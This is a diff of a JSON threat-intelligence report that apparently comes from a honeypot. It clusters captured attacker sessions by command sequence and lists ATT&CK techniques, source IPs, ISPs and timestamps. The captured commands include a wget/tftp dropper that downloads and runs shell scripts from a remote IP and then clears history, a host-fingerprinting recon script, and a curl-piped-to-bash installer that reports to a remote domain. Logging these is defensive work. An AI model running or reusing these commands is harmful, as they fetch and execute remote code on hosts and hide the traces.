@@ -1,153 +1,238 @@
 {
-  "generated_at": "2026-06-27T15:18:57.780441+00:00",
-  "total_sessions_with_commands": 152,
-  "total_clusters": 5,
-  "campaign_clusters": 2,
-  "singleton_clusters": 2,
-  "highest_severity": "HIGH",
-  "active_campaigns": [
-    {
-      "cluster_id": "CLU-001",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1592",
-        "T1078",
-        "T1083"
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "name": "Mirai/IoT Botnet",
-      "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
-      "ttps": [
-        "T1082",
-        "T1105",
-        "T1059.004"
-      ]
-    }
-  ],
+  "generated_at": "2026-06-27T17:15:54.631476+00:00",
+  "total_sessions_with_commands": 157,
+  "total_clusters": 3,
+  "campaign_clusters": 0,
+  "singleton_clusters": 0,
+  "highest_severity": "NONE",
+  "active_campaigns": [],
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-      "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 6,
-          "pattern_total": 6
-        }
-      ],
-      "session_count": 1,
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
       "unique_ips": [
-        "91.92.40.13"
+        "165.1.75.106"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "631b54e3d9c41137",
+      "sequence_hash": "d2af147dd3fa2817",
       "ttps": [
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
-          "id": "T1078",
-          "name": "T1078"
-        },
-        {
-          "id": "T1083",
-          "name": "T1083"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         }
       ],
       "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ;",
-        "uname -s -v -n -m 2 > /dev/null",
-        "uname -m 2 > /dev/null",
-        "cat /proc/uptime 2 > /dev/null | cut -d. -f1"
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
       ],
       "members": [
         {
-          "session_id": "IR-c42bb0ab4dc8",
-          "src_ip": "91.92.40.13",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 4,
-          "timestamp": "2026-06-27T12:57:21.258781Z"
+          "session_id": "IR-7a66bcb1c03c",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-06-27T15:18:40.947045Z"
+        },
+        {
+          "session_id": "IR-900f89ee2b14",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-06-27T15:21:03.839297Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
-      "is_campaign": true,
-      "campaign_name": "Mirai/IoT Botnet",
-      "campaign_severity": "HIGH",
-      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-      "matched_campaigns": [
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 2,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 1,
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 20,
       "unique_ips": [
-        "141.11.88.100"
+        "45.205.1.42",
+        "45.148.10.239",
+        "45.198.224.120"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "247e5eacc7fee14d",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1105",
-          "name": "T1105"
-        },
-        {
-          "id": "T1059.004",
-          "name": "T1059.004"
-        }
-      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "7d10fced96b38c84",
+      "ttps": [],
       "representative_commands": [
-        "echo SHELL_TEST",
-        "/bin/busybox TEST",
-        "cat /proc",
-        "./"
+        "echo OK"
       ],
       "members": [
         {
-          "session_id": "IR-b8719991f592",
-          "src_ip": "141.11.88.100",
-          "country": "US",
-          "isp": "Vantiva SA",
-          "command_count": 4,
-          "timestamp": "2026-06-27T13:31:44.568889Z"
+          "session_id": "IR-35b718e52cef",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T14:55:21.654596Z"
+        },
+        {
+          "session_id": "IR-34de52dee00d",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:01:02.034309Z"
+        },
+        {
+          "session_id": "IR-d92c8030a70c",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:09:50.110009Z"
+        },
+        {
+          "session_id": "IR-8b5cd8bd40c8",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:12:39.703115Z"
+        },
+        {
+          "session_id": "IR-cafeb89369a0",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:24:15.125683Z"
+        },
+        {
+          "session_id": "IR-a49fb6b886b8",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:24:22.664850Z"
+        },
+        {
+          "session_id": "IR-94dac09f2133",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:36:06.815269Z"
+        },
+        {
+          "session_id": "IR-fd2ce74bcb60",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:38:15.959240Z"
+        },
+        {
+          "session_id": "IR-d508a158566e",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:47:37.495809Z"
+        },
+        {
+          "session_id": "IR-509d7e30f860",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:52:34.886728Z"
+        },
+        {
+          "session_id": "IR-af18f1f774bb",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T15:59:05.330078Z"
+        },
+        {
+          "session_id": "IR-7b3529f69512",
+          "src_ip": "45.148.10.239",
+          "country": "NL",
+          "isp": "TECHOFF SRV LIMITED",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:02:26.586360Z"
+        },
+        {
+          "session_id": "IR-c135566a83d7",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:07:07.966366Z"
+        },
+        {
+          "session_id": "IR-070ec8e80a1a",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:10:44.973912Z"
+        },
+        {
+          "session_id": "IR-cb91b6651148",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:21:24.956118Z"
+        },
+        {
+          "session_id": "IR-aa41a5d07276",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:22:18.331130Z"
+        },
+        {
+          "session_id": "IR-3db6554b4cfa",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:33:44.177584Z"
+        },
+        {
+          "session_id": "IR-6715fa57855e",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:35:36.104323Z"
+        },
+        {
+          "session_id": "IR-1a5be5f3be62",
+          "src_ip": "45.198.224.120",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:45:36.504501Z"
+        },
+        {
+          "session_id": "IR-26dfe7536eda",
+          "src_ip": "45.205.1.42",
+          "country": "BR",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 1,
+          "timestamp": "2026-06-27T16:49:46.214740Z"
         }
       ]
     },
@@ -158,65 +243,7 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 3,
-      "unique_ips": [
-        "176.65.139.140"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d0caa477f2c2a3ed",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        }
-      ],
-      "representative_commands": [
-        "sh",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.168.110.191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110.191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
-      ],
-      "members": [
-        {
-          "session_id": "IR-ace02681b0d3",
-          "src_ip": "176.65.139.140",
-          "country": "NL",
-          "isp": "Storm Industries LLC",
-          "command_count": 2,
-          "timestamp": "2026-06-27T13:53:23.991882Z"
-        },
-        {
-          "session_id": "IR-e5eaf9c0d311",
-          "src_ip": "176.65.139.140",
-          "country": "NL",
-          "isp": "Storm Industries LLC",
-          "command_count": 2,
-          "timestamp": "2026-06-27T13:55:08.616763Z"
-        },
-        {
-          "session_id": "IR-94c7267c3e79",
-          "src_ip": "176.65.139.140",
-          "country": "NL",
-          "isp": "Storm Industries LLC",
-          "command_count": 2,
-          "timestamp": "2026-06-27T13:57:41.453293Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 129,
+      "session_count": 135,
       "unique_ips": [
         "209.99.185.59"
       ],
@@ -233,1201 +260,1084 @@
       ],
       "members": [
         {
-          "session_id": "IR-598b0087e006",
+          "session_id": "IR-b85fca862c44",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T12:55:56.476428Z"
+          "timestamp": "2026-06-27T14:55:40.412860Z"
         },
         {
-          "session_id": "IR-941eb1b1bfb1",
+          "session_id": "IR-fca8a28f7ab0",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T12:56:49.430182Z"
+          "timestamp": "2026-06-27T14:56:33.787270Z"
         },
         {
-          "session_id": "IR-b164228999cb",
+          "session_id": "IR-37a3a43ac432",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T12:57:41.757139Z"
+          "timestamp": "2026-06-27T14:57:27.255139Z"
         },
         {
-          "session_id": "IR-cfde74c535d0",
+          "session_id": "IR-288232193696",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T12:58:36.098916Z"
+          "timestamp": "2026-06-27T14:58:23.598245Z"
         },
         {
-          "session_id": "IR-dda86a270019",
+          "session_id": "IR-f1b82d8c1663",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T12:59:32.114771Z"
+          "timestamp": "2026-06-27T14:59:19.867644Z"
         },
         {
-          "session_id": "IR-e13f1f1c5d59",
+          "session_id": "IR-ac08d40ecfba",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:00:28.119282Z"
+          "timestamp": "2026-06-27T15:00:15.648744Z"
         },
         {
-          "session_id": "IR-f1c7ce410f78",
+          "session_id": "IR-6ecea0f3c682",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:01:24.176245Z"
+          "timestamp": "2026-06-27T15:01:17.185485Z"
         },
         {
-          "session_id": "IR-70c9e3a353a8",
+          "session_id": "IR-afb24ed087c1",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:02:20.693294Z"
+          "timestamp": "2026-06-27T15:02:14.836775Z"
         },
         {
-          "session_id": "IR-efb8c8c80905",
+          "session_id": "IR-16e7dfe115be",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:03:14.244623Z"
+          "timestamp": "2026-06-27T15:03:12.114267Z"
         },
         {
-          "session_id": "IR-1cd9d8f3b244",
+          "session_id": "IR-259d81249755",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:04:08.477710Z"
+          "timestamp": "2026-06-27T15:04:14.214311Z"
         },
         {
-          "session_id": "IR-8f3c7335a144",
+          "session_id": "IR-c6b190bc61c3",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:05:03.298679Z"
+          "timestamp": "2026-06-27T15:05:12.636584Z"
         },
         {
-          "session_id": "IR-9ae2d34f1d14",
+          "session_id": "IR-7ea945421f02",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:05:59.775588Z"
+          "timestamp": "2026-06-27T15:06:09.341204Z"
         },
         {
-          "session_id": "IR-b561c8c342c6",
+          "session_id": "IR-5b38b3f93a2d",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:06:56.554713Z"
+          "timestamp": "2026-06-27T15:07:08.145286Z"
         },
         {
-          "session_id": "IR-1898ffdb234b",
+          "session_id": "IR-c8e66249cc81",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:07:52.649296Z"
+          "timestamp": "2026-06-27T15:08:08.532021Z"
         },
         {
-          "session_id": "IR-cb2335ebf9ee",
+          "session_id": "IR-1464a3b12625",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:08:46.627292Z"
+          "timestamp": "2026-06-27T15:09:06.486743Z"
         },
         {
-          "session_id": "IR-d969ff4147c8",
+          "session_id": "IR-61c31211d828",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:09:40.307258Z"
+          "timestamp": "2026-06-27T15:10:03.174093Z"
         },
         {
-          "session_id": "IR-9ddcb9f37e63",
+          "session_id": "IR-703344e8002f",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:10:36.800107Z"
+          "timestamp": "2026-06-27T15:11:00.095845Z"
         },
         {
-          "session_id": "IR-0f1ec6b603c9",
+          "session_id": "IR-4cdc585b8706",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:11:35.409317Z"
+          "timestamp": "2026-06-27T15:11:58.149009Z"
         },
         {
-          "session_id": "IR-abc270c0b061",
+          "session_id": "IR-0772671a94cb",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:12:31.352690Z"
+          "timestamp": "2026-06-27T15:12:56.881459Z"
         },
         {
-          "session_id": "IR-dd93f5d35316",
+          "session_id": "IR-d76711e64317",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:13:28.279516Z"
+          "timestamp": "2026-06-27T15:13:56.336373Z"
         },
         {
-          "session_id": "IR-93b2378961a0",
+          "session_id": "IR-d7211e9a2841",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:14:28.653469Z"
+          "timestamp": "2026-06-27T15:14:58.750416Z"
         },
         {
-          "session_id": "IR-c4ba1b53c844",
+          "session_id": "IR-b74685ccdd60",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:15:27.610441Z"
+          "timestamp": "2026-06-27T15:15:59.943431Z"
         },
         {
-          "session_id": "IR-38c98b3942be",
+          "session_id": "IR-4e4e3f03e7cb",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:16:26.656932Z"
+          "timestamp": "2026-06-27T15:16:58.145867Z"
         },
         {
-          "session_id": "IR-4c478cbfea16",
+          "session_id": "IR-9c119f6a242c",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:17:22.319397Z"
+          "timestamp": "2026-06-27T15:17:58.290602Z"
         },
         {
-          "session_id": "IR-87741bea3592",
+          "session_id": "IR-fb5ad421c4c2",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:18:20.417063Z"
+          "timestamp": "2026-06-27T15:18:57.356843Z"
         },
         {
-          "session_id": "IR-109fc99e3e02",
+          "session_id": "IR-98629ee42ddf",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:19:18.274175Z"
+          "timestamp": "2026-06-27T15:19:57.294696Z"
         },
         {
-          "session_id": "IR-bd516db914c3",
+          "session_id": "IR-cf4a7810d530",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:20:15.645637Z"
+          "timestamp": "2026-06-27T15:20:55.037294Z"
         },
         {
-          "session_id": "IR-224f1ad6d2b6",
+          "session_id": "IR-baaff6697aa4",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:21:12.019869Z"
+          "timestamp": "2026-06-27T15:21:52.549860Z"
         },
         {
-          "session_id": "IR-df897d63b3ea",
+          "session_id": "IR-3b08812633ab",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:22:07.871907Z"
+          "timestamp": "2026-06-27T15:22:49.905766Z"
         },
         {
-          "session_id": "IR-c1da682e3924",
+          "session_id": "IR-1b66d19fe8ae",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:23:04.196941Z"
+          "timestamp": "2026-06-27T15:23:51.528798Z"
         },
         {
-          "session_id": "IR-8090131ee0ce",
+          "session_id": "IR-982267cf81c3",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:24:01.780243Z"
+          "timestamp": "2026-06-27T15:24:51.270867Z"
         },
         {
-          "session_id": "IR-3f2e2f550b97",
+          "session_id": "IR-9d21e804fee6",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:25:00.796666Z"
+          "timestamp": "2026-06-27T15:25:51.730743Z"
         },
         {
-          "session_id": "IR-b9b060c8279f",
+          "session_id": "IR-b9389755e3d4",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:26:03.949475Z"
+          "timestamp": "2026-06-27T15:26:52.566111Z"
         },
         {
-          "session_id": "IR-a5d0b9b69146",
+          "session_id": "IR-519ee0b31bf2",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:27:02.498054Z"
+          "timestamp": "2026-06-27T15:27:52.878824Z"
         },
         {
-          "session_id": "IR-ff231498510f",
+          "session_id": "IR-9b97f5857358",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:28:03.049196Z"
+          "timestamp": "2026-06-27T15:28:52.367165Z"
         },
         {
-          "session_id": "IR-ee521045665c",
+          "session_id": "IR-d33aa3db420a",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:29:06.442780Z"
+          "timestamp": "2026-06-27T15:29:53.313786Z"
         },
         {
-          "session_id": "IR-535689bb2a95",
+          "session_id": "IR-7c735fe31f4c",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:30:04.520667Z"
+          "timestamp": "2026-06-27T15:30:54.268286Z"
         },
         {
-          "session_id": "IR-d7803a705fcf",
+          "session_id": "IR-c6653d90e3e8",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:31:03.988144Z"
+          "timestamp": "2026-06-27T15:31:55.874367Z"
         },
         {
-          "session_id": "IR-e46ea448cd34",
+          "session_id": "IR-ca801ce25db8",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:32:04.986992Z"
+          "timestamp": "2026-06-27T15:32:57.949821Z"
         },
         {
-          "session_id": "IR-33f28dd07813",
+          "session_id": "IR-d521804b19ba",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:33:05.885983Z"
+          "timestamp": "2026-06-27T15:34:02.953867Z"
         },
         {
-          "session_id": "IR-efae8dfea8bf",
+          "session_id": "IR-22970d432b22",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:34:10.344480Z"
+          "timestamp": "2026-06-27T15:35:02.011757Z"
         },
         {
-          "session_id": "IR-f3dda74c6c66",
+          "session_id": "IR-6c89fdf15856",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:35:14.737368Z"
+          "timestamp": "2026-06-27T15:36:03.743770Z"
         },
         {
-          "session_id": "IR-37703131ab04",
+          "session_id": "IR-0cd325c0d568",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:36:18.991511Z"
+          "timestamp": "2026-06-27T15:37:04.612772Z"
         },
         {
-          "session_id": "IR-aae328161f41",
+          "session_id": "IR-fdfa36de4a2a",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:37:21.020247Z"
+          "timestamp": "2026-06-27T15:38:11.603973Z"
         },
         {
-          "session_id": "IR-4c1e4fd132e3",
+          "session_id": "IR-a7da0e0d2f68",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:38:27.821155Z"
+          "timestamp": "2026-06-27T15:39:16.477952Z"
         },
         {
-          "session_id": "IR-5ed51bba25a9",
+          "session_id": "IR-5ff1ed41919e",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:39:31.822373Z"
+          "timestamp": "2026-06-27T15:40:25.096817Z"
         },
         {
-          "session_id": "IR-e290cfb7e57c",
+          "session_id": "IR-8dcadc57cb98",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:40:33.816922Z"
+          "timestamp": "2026-06-27T15:41:27.795211Z"
         },
         {
-          "session_id": "IR-64f84da64748",
+          "session_id": "IR-80263ada3a50",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:41:35.831681Z"
+          "timestamp": "2026-06-27T15:42:29.517580Z"
         },
         {
-          "session_id": "IR-fd8681544996",
+          "session_id": "IR-e86fe3f10133",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:42:37.978772Z"
+          "timestamp": "2026-06-27T15:43:32.141461Z"
         },
         {
-          "session_id": "IR-c07aa5306039",
+          "session_id": "IR-af7ea003f112",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:43:39.946312Z"
+          "timestamp": "2026-06-27T15:44:34.915262Z"
         },
         {
-          "session_id": "IR-c22d3f5999a3",
+          "session_id": "IR-6ff38d29d570",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:44:43.694836Z"
+          "timestamp": "2026-06-27T15:45:38.293823Z"
         },
         {
-          "session_id": "IR-4ccac15a921a",
+          "session_id": "IR-7b2cce7769d0",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:45:46.848392Z"
+          "timestamp": "2026-06-27T15:46:40.737563Z"
         },
         {
-          "session_id": "IR-db73c8199cce",
+          "session_id": "IR-2111c148cb94",
           "src_ip": "209.99.185.59",
           "country": "CH",
           "isp": "SKN Subnet & Telecom Ltd",
           "command_count": 1,
-          "timestamp": "2026-06-27T13:46:51.075133Z"
+          "timestamp": "2026-06-27T15:47:41.765788Z"
         },
         {
